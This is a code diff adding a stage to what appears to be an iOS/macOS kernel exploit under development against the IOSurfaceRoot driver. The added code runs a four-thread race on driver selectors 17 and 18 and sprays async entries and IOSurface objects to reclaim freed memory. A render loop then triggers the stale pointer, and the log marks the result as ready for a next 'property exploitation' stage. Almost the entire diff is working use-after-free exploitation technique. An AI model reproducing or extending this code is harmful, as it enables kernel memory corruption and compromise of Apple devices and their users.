@@ -25134,6 +25134,147 @@ new_modes:
                 rlog("=== r=206 complete ===\n");
             }
 
+            /* r=207: Multi-threaded race + dual spray for reliable UAF stabilization
+             *
+             * Improvements over r=206:
+             *   1. Multi-threaded race: 2 threads sel17 + 2 threads sel18 concurrently
+             *   2. Dual spray: sel17 entries (same 24-byte type zone) + IOSurface objects
+             *   3. Full cleanup between iterations to prevent resource exhaustion
+             *   4. Spray-then-render ordering to maximize reclaim window
+             *
+             * Usage: iosurface_sel17 207 [spray_count] [race_rounds]
+             */
+            if (rounds == 207) {
+                rlog("\n=== r=207: Multi-threaded race + dual spray ===\n");
+                int r207_spray = 400;
+                int r207_races = 10;
+                if (argc > 3) r207_spray = atoi(argv[3]);
+                if (argc > 4) r207_races = atoi(argv[4]);
+                if (r207_spray < 10) r207_spray = 10;
+                if (r207_spray > 2000) r207_spray = 2000;
+                if (r207_races < 1) r207_races = 1;
+                if (r207_races > 50) r207_races = 50;
+                rlog("  Spray: %d  Races: %d\n", r207_spray, r207_races);
+
+                io_service_t r207_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r207_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r207_done; }
+
+                CFMutableDictionaryRef r207_props = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int r207_w = 32, r207_h = 32, r207_bpe = 4, r207_pf = 0x42475241;
+                CFNumberRef r207_wn = CFNumberCreate(NULL, kCFNumberIntType, &r207_w);
+                CFNumberRef r207_hn = CFNumberCreate(NULL, kCFNumberIntType, &r207_h);
+                CFNumberRef r207_bn = CFNumberCreate(NULL, kCFNumberIntType, &r207_bpe);
+                CFNumberRef r207_pfn = CFNumberCreate(NULL, kCFNumberIntType, &r207_pf);
+                CFDictionarySetValue(r207_props, CFSTR("IOSurfaceWidth"), r207_wn);
+                CFDictionarySetValue(r207_props, CFSTR("IOSurfaceHeight"), r207_hn);
+                CFDictionarySetValue(r207_props, CFSTR("IOSurfaceBytesPerElement"), r207_bn);
+                CFDictionarySetValue(r207_props, CFSTR("IOSurfacePixelFormat"), r207_pfn);
+
+                int r207_survived = 0;
+
+                for (int race = 0; race < r207_races; race++) {
+                    rlog("\n  --- Race %d/%d ---\n", race + 1, r207_races);
+
+                    io_connect_t r207_rc = IO_OBJECT_NULL;
+                    IOServiceOpen(r207_svc, mach_task_self(), 0, &r207_rc);
+                    if (!r207_rc) { rlog("  open failed\n"); continue; }
+
+                    /* Phase 1: Multi-threaded race using shared globals */
+                    p11b_conn = r207_rc;
+                    p11b_go = 0;
+                    p11b_done = 0;
+
+                    pthread_t r207_ths[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&r207_ths[t], NULL, p11b_worker, (void *)(uintptr_t)t);
+
+                    usleep(1000);
+                    p11b_go = 1;
+
+                    for (int t = 0; t < 4; t++)
+                        pthread_join(r207_ths[t], NULL);
+
+                    rlog("  Race done (4 threads × 100 iters)\n");
+
+                    /* Phase 2: Dual spray — sel17 entries + IOSurface objects */
+                    /* Spray sel17 entries on FRESH connections (same 24-byte type zone) */
+                    #define R207_SPRAY_CONNS 8
+                    io_connect_t r207_sconns[R207_SPRAY_CONNS];
+                    mach_port_t r207_swps[R207_SPRAY_CONNS * 64];
+                    int r207_sn = 0;
+                    for (int c = 0; c < R207_SPRAY_CONNS; c++) {
+                        r207_sconns[c] = IO_OBJECT_NULL;
+                        IOServiceOpen(r207_svc, mach_task_self(), 0, &r207_sconns[c]);
+                        if (!r207_sconns[c]) continue;
+                        for (int e = 0; e < 64; e++) {
+                            mach_port_t wp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                            mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0x207000 + c * 64 + e;
+                            uint64_t inp[3] = {(uint64_t)(c * 64 + e + 1), 0xBEEF, 0xCAFE};
+                            IOConnectCallAsyncMethod(r207_sconns[c], 17, wp, &ref, 1,
+                                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                            r207_swps[r207_sn++] = wp;
+                        }
+                    }
+                    rlog("  Sprayed %d sel17 entries on %d connections\n", r207_sn, R207_SPRAY_CONNS);
+
+                    /* Spray IOSurface objects (reclaim IOSurface obj pointed by stale entry) */
+                    IOSurfaceRef *r207_surfs = calloc(r207_spray, sizeof(IOSurfaceRef));
+                    int r207_created = 0;
+                    for (int i = 0; i < r207_spray; i++) {
+                        r207_surfs[i] = IOSurfaceCreate(r207_props);
+                        if (r207_surfs[i]) r207_created++;
+                    }
+                    rlog("  Sprayed %d/%d IOSurface objects\n", r207_created, r207_spray);
+
+                    /* Phase 3: Render loop — triggers compositor registry walk */
+                    rlog("  Render (3s)...");
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t r207_rt;
+                    pthread_create(&r207_rt, NULL, p13_render_loop, NULL);
+                    for (int s = 0; s < 3; s++) {
+                        usleep(1000000);
+                        rlog(" +%ds", s + 1);
+                    }
+                    p13_render_run = 0;
+                    pthread_join(r207_rt, NULL);
+                    rlog(" frames=%d\n", p13_render_frames);
+
+                    rlog("  *** SURVIVED race %d ***\n", race + 1);
+                    r207_survived++;
+
+                    /* Full cleanup */
+                    IOServiceClose(r207_rc);
+                    for (int c = 0; c < R207_SPRAY_CONNS; c++)
+                        if (r207_sconns[c]) IOServiceClose(r207_sconns[c]);
+                    for (int i = 0; i < r207_sn; i++)
+                        mach_port_deallocate(mach_task_self(), r207_swps[i]);
+                    for (int i = 0; i < r207_spray; i++)
+                        if (r207_surfs[i]) CFRelease(r207_surfs[i]);
+                    free(r207_surfs);
+                    usleep(200000);
+                }
+
+                rlog("\n=== r=207 RESULTS ===\n");
+                rlog("  Survived: %d/%d\n", r207_survived, r207_races);
+                if (r207_survived == r207_races)
+                    rlog("  FULL SURVIVAL — ready for r=208 property exploitation\n");
+                else
+                    rlog("  Partial — %d panics in %d races\n",
+                         r207_races - r207_survived, r207_races);
+
+                CFRelease(r207_wn); CFRelease(r207_hn);
+                CFRelease(r207_bn); CFRelease(r207_pfn);
+                CFRelease(r207_props);
+                IOObjectRelease(r207_svc);
+                r207_done:
+                rlog("=== r=207 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
